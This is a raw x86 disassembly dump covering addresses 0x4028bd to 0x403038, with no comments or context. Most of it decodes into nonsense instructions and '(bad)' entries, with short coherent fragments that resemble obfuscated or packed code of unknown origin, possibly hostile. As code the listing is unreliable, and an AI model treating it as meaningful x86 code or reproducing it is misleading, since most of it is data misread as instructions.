  4028bd:	jbe    0x402840
  4028bf:	jae    0x402933
  4028c1:	lock fidiv WORD PTR [ecx+0x5c]
  4028c5:	ins    DWORD PTR es:[edi],dx
  4028c6:	fld    DWORD PTR [ecx]
  4028c8:	sbb    DWORD PTR [eax-0x59],esp
  4028cb:	mov    ch,0xd
  4028cd:	xor    BYTE PTR [edx],ah
  4028cf:	enter  0xda07,0x9f
  4028d3:	hlt    
  4028d4:	sub    edx,DWORD PTR [edx]
  4028d6:	xlat   BYTE PTR ds:[ebx]
  4028d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d8:	je     0x402880
  4028da:	std    
  4028db:	lahf   
  4028dc:	pop    edi
  4028dd:	push   0x483aa4d0
  4028e2:	dec    eax
  4028e3:	adc    DWORD PTR [esp+eiz*4-0x7fbdb5cc],ebx
  4028ea:	ret    0x14b9
  4028ed:	mov    BYTE PTR [esi],0x5b
  4028f0:	sbb    al,0x3f
  4028f2:	(bad)  
  4028f3:	mov    edi,0xb6bbc991
  4028f8:	fmul   DWORD PTR [ecx]
  4028fa:	scas   eax,DWORD PTR es:[edi]
  4028fb:	rol    DWORD PTR [esi],0x78
  4028fe:	pop    ebp
  4028ff:	cmc    
  402900:	and    eax,0x8f633a1
  402905:	sti    
  402906:	shl    esp,0x87
  402909:	mov    ds:0x91dcc14b,eax
  40290e:	mov    eax,eax
  402910:	jns    0x40290a
  402912:	inc    ebp
  402913:	(bad)  
  402914:	mov    edi,0xed07e2cf
  402919:	push   edx
  40291a:	cmp    dl,dl
  40291c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40291d:	aas    
  40291e:	(bad)  
  40291f:	in     al,dx
  402920:	js     0x4028da
  402922:	sbb    DWORD PTR [esi-0x6d757297],0xeb91b8e5
  40292c:	sub    BYTE PTR [edi-0x67e65ff],al
  402932:	sub    ch,BYTE PTR [ebx-0x2a]
  402935:	sbb    dh,BYTE PTR [eax-0x61]
  402938:	mov    dl,0x4c
  40293a:	sbb    BYTE PTR [ebx+0x1fc77b3c],dh
  402940:	and    BYTE PTR [esi-0x2],ah
  402943:	in     eax,0x7a
  402945:	jns    0x4029c6
  402947:	mov    al,ds:0x21feedbd
  40294c:	xor    bl,BYTE PTR ds:0x242c44b4
  402952:	jae    0x40295e
  402954:	mov    WORD PTR [edx+0x55e815e3],?
  40295a:	(bad)  
  40295b:	or     BYTE PTR [eax+0x25],al
  40295e:	test   DWORD PTR [edx],ebx
  402960:	inc    esi
  402961:	inc    esp
  402962:	rcr    BYTE PTR [edx],cl
  402964:	mov    al,ds:0x19ae45ce
  402969:	shl    eax,1
  40296b:	ins    DWORD PTR es:[edi],dx
  40296c:	repz add DWORD PTR [esi+0x305728a],eax
  402973:	inc    ebp
  402974:	sar    DWORD PTR [eax],cl
  402976:	jmp    0xc16111c5
  40297b:	jecxz  0x4029db
  40297d:	xlat   BYTE PTR ds:[ebx]
  40297e:	dec    esi
  40297f:	xlat   BYTE PTR ds:[ebx]
  402980:	push   esi
  402981:	nop
  402982:	xchg   edx,eax
  402983:	sti    
  402984:	jbe    0x4029a5
  402986:	pop    ebx
  402987:	mov    dl,0xd1
  402989:	ds js  0x4029b1
  40298c:	jnp    0x4029f6
  40298e:	daa    
  40298f:	daa    
  402990:	in     eax,0x23
  402992:	lods   al,BYTE PTR ds:[esi]
  402993:	sbb    BYTE PTR [eax],dl
  402995:	adc    eax,0x6e06cda7
  40299a:	call   0xbfa5512c
  40299f:	imul   edx,DWORD PTR [esp+ebp*1],0xcdec338d
  4029a6:	repz es xchg esi,eax
  4029a9:	fnstcw WORD PTR [ebp-0x511808cc]
  4029af:	jne    0x402997
  4029b1:	xlat   BYTE PTR ds:[ebx]
  4029b2:	outs   dx,DWORD PTR ds:[esi]
  4029b3:	in     eax,0xc4
  4029b5:	or     bh,BYTE PTR [edi+0x5b5fda3d]
  4029bb:	push   cs
  4029bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bd:	aaa    
  4029be:	ret    
  4029bf:	out    0xd7,al
  4029c1:	cmc    
  4029c2:	and    BYTE PTR [ebx-0x2d],ah
  4029c5:	cli    
  4029c6:	sub    BYTE PTR [ecx],bh
  4029c8:	test   eax,0x8e0c3453
  4029cd:	or     DWORD PTR [edi+0x52],eax
  4029d0:	push   ecx
  4029d1:	outs   dx,DWORD PTR ds:[esi]
  4029d2:	xchg   edi,eax
  4029d3:	ficomp WORD PTR [ebp+ebx*2-0x406f11d8]
  4029da:	xchg   DWORD PTR [ecx-0x7e],edi
  4029dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029de:	rol    ebp,0xaa
  4029e1:	inc    edi
  4029e2:	cmp    eax,0x37c54e55
  4029e7:	jo     0x4029dd
  4029e9:	pusha  
  4029ea:	mov    bh,0xf6
  4029ec:	out    dx,al
  4029ed:	cdq    
  4029ee:	push   cs
  4029ef:	and    al,0x9b
  4029f1:	cmc    
  4029f2:	stos   DWORD PTR es:[edi],eax
  4029f3:	daa    
  4029f4:	leave  
  4029f5:	sbb    BYTE PTR [eax+0x2b],cl
  4029f8:	xchg   esp,eax
  4029f9:	das    
  4029fa:	rol    BYTE PTR [eax-0x2e],1
  4029fd:	fnstcw WORD PTR [eax-0x2e23acaf]
  402a03:	shr    BYTE PTR ds:0xab6db8e2,cl
  402a09:	mov    cl,BYTE PTR [eax+edx*4-0x7ca3f2a6]
  402a10:	inc    ebx
  402a11:	mov    dl,0x8b
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	call   0x7e0d:0xaab87a5f
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402aa6
  402a41:	cwde   
  402a42:	lds    eax,FWORD PTR [ebx+0x58c9a031]
  402a48:	cs xchg esi,ebp
  402a4b:	jmp    0x4029d5
  402a4d:	cwde   
  402a4e:	(bad)  
  402a4f:	mov    esp,0x2738cd2c
  402a54:	pop    ebp
  402a55:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402a57:	xor    eax,0x1c4ff59
  402a5c:	leave  
  402a5d:	jae    0x402a52
  402a5f:	ins    BYTE PTR es:[edi],dx
  402a60:	aaa    
  402a61:	xchg   edx,eax
  402a62:	adc    DWORD PTR [edi+0x67],eax
  402a65:	cmp    ecx,DWORD PTR [ebx+esi*1]
  402a68:	adc    al,0xb0
  402a6a:	aam    0xd9
  402a6c:	jmp    0x19ff78d7
  402a71:	inc    edi
  402a72:	push   eax
  402a73:	aad    0xb8
  402a75:	ficomp DWORD PTR [ecx+edx*8-0x67bee624]
  402a7c:	xor    eax,0x13ab4edc
  402a81:	pop    esi
  402a82:	xor    DWORD PTR [ecx-0x7c],edx
  402a85:	call   0x3dea74bb
  402a8a:	mov    cl,0xf5
  402a8c:	out    0x42,al
  402a8e:	jne    0x402adc
  402a90:	push   ss
  402a91:	xchg   BYTE PTR [ebp-0x8],cl
  402a94:	mov    bl,0x79
  402a96:	or     edx,edi
  402a98:	daa    
  402a99:	xor    ebx,ebx
  402a9b:	sar    DWORD PTR [ecx+0x30a3cb4],cl
  402aa1:	or     edx,ebx
  402aa3:	cli    
  402aa4:	cmp    ebx,0x86bae469
  402aaa:	sbb    esi,ebp
  402aac:	(bad)  
  402aad:	and    BYTE PTR [eax+ebx*4+0x25860083],bl
  402ab4:	hlt    
  402ab5:	shl    ah,0x8a
  402ab8:	imul   ebx,DWORD PTR [ecx],0x55
  402abb:	sti    
  402abc:	jl     0x402a83
  402abe:	mov    al,0x86
  402ac0:	daa    
  402ac1:	imul   esi,DWORD PTR [edi],0x12
  402ac4:	dec    ecx
  402ac5:	fadd   st(7),st
  402ac7:	sbb    eax,0xff1c865b
  402acc:	sbb    ebx,DWORD PTR [edx-0x50bd960f]
  402ad2:	push   cs
  402ad3:	outs   dx,BYTE PTR ds:[esi]
  402ad4:	add    ebp,eax
  402ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad7:	xchg   esi,eax
  402ad8:	leave  
  402ad9:	ins    BYTE PTR es:[edi],dx
  402ada:	aad    0xbc
  402adc:	arpl   WORD PTR [ebx+eiz*8-0x2f1c1ed5],cx
  402ae3:	cli    
  402ae4:	cs stos BYTE PTR es:[edi],al
  402ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae7:	pop    ebx
  402ae8:	mov    BYTE PTR [ebx],dl
  402aea:	mov    DWORD PTR [eax],0x250d0b92
  402af0:	mov    WORD PTR [ebx],es
  402af2:	or     DWORD PTR [edx],edx
  402af4:	pusha  
  402af5:	push   ebx
  402af6:	adc    al,0xef
  402af8:	es cdq 
  402afa:	sbb    ebx,DWORD PTR [esi]
  402afc:	xor    ebp,0xb1844711
  402b02:	iret   
  402b03:	leave  
  402b04:	push   cs
  402b05:	xchg   esp,eax
  402b06:	stos   BYTE PTR es:[edi],al
  402b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b08:	mov    ds:0x7017dc6e,eax
  402b0d:	les    esp,FWORD PTR [ebx]
  402b0f:	dec    ecx
  402b10:	cmp    eax,0xcd67ada7
  402b15:	push   esi
  402b16:	daa    
  402b17:	shl    DWORD PTR [ecx+0x25177812],0xe4
  402b1e:	(bad)  
  402b20:	jle    0x402b47
  402b22:	jl     0x402b3e
  402b24:	dec    ebp
  402b25:	push   es
  402b26:	mov    esi,0x5c825cfe
  402b2b:	call   0x4ce8:0x871a59e3
  402b32:	loopne 0x402b10
  402b34:	in     eax,dx
  402b35:	xchg   edx,eax
  402b36:	or     BYTE PTR [ebx],bl
  402b38:	inc    eax
  402b39:	dec    esi
  402b3a:	add    al,0xdb
  402b3c:	cmp    eax,0x69a946c6
  402b41:	(bad)  
  402b42:	push   0x920e7050
  402b47:	xor    edi,DWORD PTR [edx+0x37]
  402b4a:	pop    ecx
  402b4b:	jmp    0x402bc5
  402b4d:	data16 sti 
  402b4f:	call   0xca2db416
  402b54:	cs xchg ebp,eax
  402b56:	punpckhdq mm7,QWORD PTR [edi-0x1f]
  402b5a:	mov    dh,0x60
  402b5c:	ins    DWORD PTR es:[edi],dx
  402b5d:	cmp    BYTE PTR [edi-0x44],dl
  402b60:	mov    ecx,0x5ed66dc7
  402b65:	ins    DWORD PTR es:[edi],dx
  402b66:	add    edx,DWORD PTR [esi+0x4f7ac2be]
  402b6c:	(bad)  
  402b6d:	popa   
  402b6e:	and    al,0x40
  402b70:	jecxz  0x402bb6
  402b72:	or     ah,dh
  402b74:	add    DWORD PTR [edx],0x73148c63
  402b7a:	push   ss
  402b7b:	pushf  
  402b7c:	mov    al,0xce
  402b7e:	cmp    al,BYTE PTR [eax+0x7622fbf2]
  402b84:	mov    edx,DWORD PTR [eax+0xb5eeefb]
  402b8a:	sbb    BYTE PTR [ebx-0x5b],dh
  402b8d:	sbb    ebp,DWORD PTR [esi+0x8734861]
  402b93:	fwait
  402b94:	out    dx,al
  402b95:	ss inc edx
  402b97:	fs add ebp,ebx
  402b9a:	push   0xf9c5fbb3
  402b9f:	push   ebx
  402ba0:	js     0x402b41
  402ba2:	sub    al,0x28
  402ba4:	fldenv [esi+ebx*2]
  402ba7:	dec    DWORD PTR [edi+0x5e]
  402baa:	shl    DWORD PTR [ebp+0xc],cl
  402bad:	outs   dx,BYTE PTR ds:[esi]
  402bae:	int    0x12
  402bb0:	mov    es,WORD PTR [eax+0x34aff7ff]
  402bb6:	sbb    al,0x55
  402bb8:	cs pusha 
  402bba:	and    DWORD PTR [esi+0x1],eax
  402bbd:	cmp    bl,al
  402bbf:	add    BYTE PTR [ebp+ebx*4+0x4a],dl
  402bc3:	mov    DWORD PTR [ebp+0x28840fc0],0x8d000000
  402bcd:	test   DWORD PTR [eax-0x1],ebp
  402bd0:	(bad)  
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	aad    0x7d
  402c13:	mov    ebp,0x7e0b3631
  402c18:	jle    0x402c14
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bf6
  402c1e:	add    ebx,DWORD PTR [esi]
  402c20:	xchg   edi,eax
  402c21:	fbld   TBYTE PTR [edi-0x607f167b]
  402c27:	fcomp  DWORD PTR [edi+0x1774a5f1]
  402c2d:	clc    
  402c2e:	cld    
  402c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c30:	pop    ecx
  402c31:	mov    BYTE PTR [ecx-0x146cd2ec],bl
  402c37:	push   ecx
  402c38:	int    0x39
  402c3a:	mov    ah,0x30
  402c3c:	add    al,0x63
  402c3e:	popa   
  402c3f:	ficomp DWORD PTR [ebx+0x483b088d]
  402c45:	or     ecx,ebp
  402c47:	hlt    
  402c48:	dec    ecx
  402c49:	pop    esi
  402c4a:	jp     0x402bef
  402c4c:	sar    edx,0x93
  402c4f:	es inc edi
  402c51:	adc    eax,0x3e0bbfb
  402c56:	xchg   esi,eax
  402c57:	stos   BYTE PTR es:[edi],al
  402c58:	scas   al,BYTE PTR es:[edi]
  402c59:	fisub  WORD PTR [eax]
  402c5b:	fimul  DWORD PTR [esi]
  402c5d:	mov    bl,BYTE PTR gs:[edx+0x1f8066d]
  402c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c65:	xchg   BYTE PTR [esi],ch
  402c67:	fdivr  QWORD PTR [edi-0x4d3c8979]
  402c6d:	sahf   
  402c6e:	add    al,ah
  402c70:	addr16 pop eax
  402c72:	cs cli 
  402c74:	les    esp,FWORD PTR ds:0x3bd18f38
  402c7a:	call   0x678d:0x4124a995
  402c81:	and    eax,0xed6698a1
  402c86:	(bad)  
  402c87:	add    DWORD PTR [ecx-0x35],ebx
  402c8a:	inc    esp
  402c8b:	cmp    BYTE PTR [esi+0x7e831d40],ch
  402c91:	push   ebx
  402c92:	clc    
  402c93:	sub    DWORD PTR [edx-0x2bab2d06],ebp
  402c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c9a:	stos   DWORD PTR es:[edi],eax
  402c9b:	js     0x402c61
  402c9d:	(bad)  
  402c9e:	push   esi
  402c9f:	aaa    
  402ca0:	pop    ebx
  402ca1:	loope  0x402c2f
  402ca3:	mov    edx,ecx
  402ca5:	dec    ebx
  402ca6:	imul   eax,edx,0x3d
  402ca9:	je     0x402d07
  402cab:	mov    ecx,0x93d50824
  402cb0:	iret   
  402cb1:	sbb    DWORD PTR [edx+ecx*1],eax
  402cb4:	pop    ebp
  402cb5:	ins    DWORD PTR es:[edi],dx
  402cb6:	inc    ebx
  402cb7:	cmc    
  402cb8:	(bad)  
  402cba:	xchg   BYTE PTR [eax],al
  402cbc:	push   0x4a3344a8
  402cc1:	in     eax,0xc9
  402cc3:	or     al,0xca
  402cc5:	mov    eax,ds:0xe35a4e5c
  402cca:	jo     0x402d47
  402ccc:	std    
  402ccd:	pushf  
  402cce:	popf   
  402ccf:	stos   DWORD PTR es:[edi],eax
  402cd0:	iret   
  402cd1:	mov    WORD PTR [eax+0x76],ss
  402cd4:	shl    esi,cl
  402cd6:	loopne 0x402cad
  402cd8:	out    dx,eax
  402cd9:	sub    ebx,DWORD PTR [edx+0x44]
  402cdc:	test   BYTE PTR [eax+0x71fbb5b4],ah
  402ce2:	mov    ch,0x78
  402ce4:	pop    ebp
  402ce5:	(bad)  
  402ce6:	xchg   esi,eax
  402ce7:	pop    edi
  402ce8:	ins    BYTE PTR es:[edi],dx
  402ce9:	jo     0x402d45
  402ceb:	ret    0x3558
  402cee:	inc    edi
  402cef:	push   cs
  402cf0:	sahf   
  402cf1:	ss xchg esp,eax
  402cf3:	ret    0x481d
  402cf6:	lahf   
  402cf7:	das    
  402cf8:	pusha  
  402cf9:	cli    
  402cfa:	push   esp
  402cfb:	icebp  
  402cfc:	aad    0x8
  402cfe:	sbb    bh,BYTE PTR [esi+0x70]
  402d01:	outs   dx,DWORD PTR ds:[esi]
  402d02:	shl    BYTE PTR [eax],0xf8
  402d05:	push   ebp
  402d06:	stos   DWORD PTR es:[edi],eax
  402d07:	push   ebx
  402d08:	mov    esi,0xc2de2304
  402d0d:	gs out dx,eax
  402d0f:	sbb    BYTE PTR [ecx+0x21],0x23
  402d13:	or     al,0xe3
  402d15:	test   dh,al
  402d17:	cdq    
  402d18:	adc    bl,BYTE PTR [edi-0x7f]
  402d1b:	push   edx
  402d1c:	add    DWORD PTR [ecx+0x1856246d],ebp
  402d22:	dec    eax
  402d23:	add    edx,esp
  402d25:	cli    
  402d26:	mov    al,0x22
  402d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d29:	std    
  402d2a:	das    
  402d2b:	and    bl,al
  402d2d:	enter  0xe002,0xd5
  402d31:	popf   
  402d32:	jnp    0x402d8a
  402d34:	or     ebx,DWORD PTR [eax+0x5d]
  402d37:	xlat   BYTE PTR ds:[ebx]
  402d38:	sahf   
  402d39:	das    
  402d3a:	clc    
  402d3b:	mov    esp,0x13dbfd8f
  402d40:	mov    ebp,0x496e64b8
  402d45:	push   ss
  402d46:	jae    0x402d5a
  402d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d49:	dec    ebp
  402d4a:	icebp  
  402d4b:	push   edi
  402d4c:	idiv   esi
  402d4e:	or     DWORD PTR ds:0x697eb500,edx
  402d54:	dec    edx
  402d55:	dec    eax
  402d56:	in     al,dx
  402d57:	test   DWORD PTR [edx-0x7],ebp
  402d5a:	mov    esi,0x17312e27
  402d5f:	inc    eax
  402d60:	cmp    edi,esp
  402d62:	xor    al,0xd0
  402d64:	stos   DWORD PTR es:[edi],eax
  402d65:	leave  
  402d66:	add    BYTE PTR [edx],ah
  402d68:	stc    
  402d69:	push   0xffffffb5
  402d6b:	xchg   bl,dl
  402d6d:	mov    ch,0x74
  402d6f:	or     al,0x77
  402d71:	into   
  402d72:	add    DWORD PTR [esi],0xffffffda
  402d75:	in     eax,dx
  402d76:	scas   ax,WORD PTR es:[edi]
  402d78:	push   0xffffff8b
  402d7a:	mov    ebp,DWORD PTR [esi+0x23]
  402d7d:	outs   dx,BYTE PTR ds:[esi]
  402d7e:	jnp    0x402d6b
  402d80:	pusha  
  402d81:	dec    eax
  402d82:	xor    edi,ecx
  402d84:	dec    ecx
  402d85:	jnp    0x402d87
  402d87:	push   0x4397e099
  402d8c:	add    dh,BYTE PTR [ebx-0x5a]
  402d8f:	mov    ebx,DWORD PTR [edx]
  402d91:	and    eax,0x7a46c05c
  402d96:	(bad)  
  402d97:	push   esp
  402d98:	mov    al,ds:0x83d10ac4
  402d9d:	fisubr WORD PTR [esi+0x452b2c4d]
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+ebx*8+0x13],1
  402de7:	nop
  402de8:	mov    edx,0x7e7e08b2
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e50
  402df2:	ret    
  402df3:	add    dl,BYTE PTR [edi-0x230faba9]
  402df9:	push   esi
  402dfa:	int    0xf1
  402dfc:	mov    BYTE PTR [edx],0xe2
  402dff:	jmp    0xeab42d2d
  402e04:	add    BYTE PTR [eax-0x1dd86d4b],dl
  402e0a:	mov    DWORD PTR [ebx],esi
  402e0c:	mov    edx,0x7251a8de
  402e11:	jle    0x402df2
  402e13:	sahf   
  402e14:	ja     0x402e1c
  402e16:	jno    0x402dd6
  402e18:	mov    ecx,0xb07c8f7e
  402e1d:	or     BYTE PTR [eax],dh
  402e1f:	lds    edi,FWORD PTR [esi]
  402e21:	adc    al,0x8b
  402e23:	(bad)  
  402e24:	dec    edi
  402e25:	maskmovq mm2,(bad)
  402e26:	not    DWORD PTR [esi+0x5b8c478]
  402e2c:	xchg   esi,eax
  402e2d:	xchg   ecx,eax
  402e2e:	xchg   edi,eax
  402e2f:	js     0x402e0c
  402e31:	in     eax,0x8e
  402e33:	hlt    
  402e34:	(bad)  
  402e35:	mov    edi,0xbde4ef82
  402e3a:	or     ah,BYTE PTR [ebx-0x3b]
  402e3d:	ins    DWORD PTR es:[edi],dx
  402e3e:	push   es
  402e3f:	sbb    dl,al
  402e41:	mov    ebp,0xea717835
  402e46:	retf   0xd58d
  402e49:	inc    eax
  402e4a:	or     eax,0xcf52847d
  402e4f:	cmc    
  402e50:	mov    dl,0x97
  402e52:	mov    esp,0xc88cd860
  402e57:	sub    eax,0xb2d6e6c8
  402e5c:	push   ecx
  402e5d:	mov    esi,0xb45d3d07
  402e62:	and    al,0xa5
  402e64:	imul   ebp,eax,0xfffffff2
  402e67:	retf   
  402e68:	pop    ecx
  402e69:	cs cdq 
  402e6b:	xor    BYTE PTR [esi+0x5ee337cc],bh
  402e71:	or     BYTE PTR [ecx],0x1d
  402e74:	add    ebp,ebp
  402e76:	xchg   BYTE PTR gs:[ebp+ebp*2+0x7cc620b6],bh
  402e7e:	(bad)  [eax]
  402e80:	mov    bh,0x84
  402e82:	xchg   DWORD PTR [edi],ebp
  402e84:	lds    esp,FWORD PTR [ebx+0x49]
  402e87:	pushf  
  402e88:	and    DWORD PTR [eax-0x4fc88910],edx
  402e8e:	jb     0x402ef2
  402e90:	mov    esp,0xad3c19d0
  402e95:	jecxz  0x402ed8
  402e97:	adc    esp,DWORD PTR ds:[esi-0x51]
  402e9b:	les    ebp,FWORD PTR [eax]
  402e9d:	out    0xab,eax
  402e9f:	jl     0x402e3a
  402ea1:	scas   al,BYTE PTR es:[edi]
  402ea2:	data16 xor al,0xcb
  402ea5:	pop    ebx
  402ea6:	mov    edi,0x96d1a7d9
  402eab:	shl    ch,0xfc
  402eae:	inc    ebx
  402eaf:	pop    esi
  402eb0:	aam    0xac
  402eb2:	cmp    al,0x3
  402eb4:	mov    dl,0xae
  402eb6:	mov    dh,0xa
  402eb8:	adc    esp,DWORD PTR [edi]
  402eba:	jp     0x402e7d
  402ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebd:	std    
  402ebe:	popa   
  402ebf:	push   ecx
  402ec0:	ror    BYTE PTR ds:0x7a846e0e,0xf9
  402ec7:	mov    ch,BYTE PTR [ebp-0x62726524]
  402ecd:	fadd   QWORD PTR [eax+0x4f]
  402ed0:	cmp    ecx,eax
  402ed2:	sub    ecx,DWORD PTR [esi-0x15]
  402ed5:	imul   eax,DWORD PTR [ebx],0x17
  402ed8:	lahf   
  402ed9:	pop    eax
  402eda:	pop    ecx
  402edb:	outs   dx,DWORD PTR ss:[esi]
  402edd:	mov    bh,0xe3
  402edf:	xlat   BYTE PTR ds:[ebx]
  402ee0:	fs into 
  402ee2:	inc    ebp
  402ee3:	(bad)  
  402ee4:	(bad)  
  402ee5:	mov    dh,0x95
  402ee7:	mov    cl,0x8e
  402ee9:	push   ds
  402eea:	rol    DWORD PTR ds:0x8842d98f,1
  402ef0:	dec    ecx
  402ef1:	rcr    DWORD PTR [ebx-0x46],0x29
  402ef5:	adc    eax,0x104c0b8d
  402efa:	psubusw mm6,QWORD PTR [edi]
  402efd:	xor    eax,DWORD PTR [eax-0x1e]
  402f00:	or     BYTE PTR [eax+esi*2-0x1c0f91a9],0x36
  402f08:	mov    ah,0x66
  402f0a:	or     eax,0x63079be3
  402f0f:	ss ror edx,cl
  402f12:	rol    BYTE PTR [eax+0x514492da],0x51
  402f19:	xlat   BYTE PTR ds:[ebx]
  402f1a:	adc    al,0x86
  402f1c:	outs   dx,DWORD PTR ds:[esi]
  402f1d:	scas   al,BYTE PTR es:[edi]
  402f1e:	je     0x402f2b
  402f20:	adc    al,bl
  402f22:	sbb    eax,0x82a18282
  402f27:	stos   DWORD PTR es:[edi],eax
  402f28:	hlt    
  402f29:	cwde   
  402f2a:	arpl   WORD PTR [eax+0x71],di
  402f2d:	lods   al,BYTE PTR ds:[esi]
  402f2e:	call   DWORD PTR [esi-0x72]
  402f31:	scas   al,BYTE PTR es:[edi]
  402f32:	std    
  402f33:	lock lods al,BYTE PTR ds:[esi]
  402f35:	adc    BYTE PTR [ebp-0x28],0xb6
  402f39:	jmp    0xd3d1af9
  402f3e:	in     eax,dx
  402f3f:	push   sp
  402f41:	(bad)  
  402f42:	icebp  
  402f43:	icebp  
  402f44:	shl    BYTE PTR [ebp-0x57],0xf7
  402f48:	push   edi
  402f49:	fmul   QWORD PTR [edi+0x640e444b]
  402f4f:	retf   0x434
  402f52:	mov    edi,0xb7de817f
  402f57:	ja     0x402f16
  402f59:	repz mov esi,0xfb1f4033
  402f5f:	xchg   esp,eax
  402f60:	(bad)  
  402f61:	pusha  
  402f62:	push   ss
  402f63:	lods   al,BYTE PTR ds:[esi]
  402f64:	and    DWORD PTR [ebp+0x3d],esp
  402f67:	arpl   WORD PTR [eax-0x2],bp
  402f6a:	pop    edx
  402f6b:	or     BYTE PTR [ebx*2-0x260560e1],0x65
  402f73:	int3   
  402f74:	and    cl,BYTE PTR [ebp+0x413c0c05]
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x611b5a49]
  402fae:	lahf   
  402faf:	jne    0x402fef
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f44
  402fb9:	xchg   esi,eax
  402fba:	adc    eax,0x1af25cc9
  402fbf:	sbb    al,0x96
  402fc1:	pop    ebx
  402fc2:	sub    eax,0x7763f12e
  402fc7:	xor    BYTE PTR [edi-0x37],0xdc
  402fcb:	dec    ebx
  402fcc:	inc    esi
  402fcd:	cmp    ah,ah
  402fcf:	push   cs
  402fd0:	sub    al,0xfa
  402fd2:	jmp    0xbfcdb789
  402fd7:	mov    ds:0xc848ffd,al
  402fdc:	sbb    DWORD PTR ds:0x52fbf78a,esp
  402fe2:	retf   
  402fe3:	sub    DWORD PTR [ebp+ebp*8+0x32],ecx
  402fe7:	les    eax,FWORD PTR [edx-0x52]
  402fea:	aaa    
  402feb:	call   0x11d4014b
  402ff0:	(bad)  
  402ff1:	sbb    bh,dh
  402ff3:	ret    0x9f74
  402ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff7:	inc    ebx
  402ff8:	xchg   ebx,edx
  402ffa:	pop    edi
  402ffb:	ret    
  402ffc:	mov    esi,0xa1703d98
  403001:	retf   
  403002:	jbe    0x403014
  403004:	and    ebx,DWORD PTR [eax+ecx*2+0x6e]
  403008:	js     0x403052
  40300a:	(bad)  
  40300c:	or     eax,0x556fd7b5
  403011:	xor    dl,BYTE PTR [ecx+eiz*4-0x12]
  403015:	dec    ebx
  403016:	adc    eax,0x34e0ced9
  40301b:	adc    DWORD PTR [ebx-0x22],ebp
  40301e:	add    bh,BYTE PTR [ebx-0x6c65bf6b]
  403024:	shr    DWORD PTR [ebx+edx*1-0x46fe9c12],cl
  40302b:	sbb    eax,ebp
  40302d:	stc    
  40302e:	mov    ds:0x9fbcd345,al
  403033:	out    dx,eax
  403034:	int3   
  403035:	dec    ebx
  403036:	sbb    al,0xc8
  403038:	int    0xd9
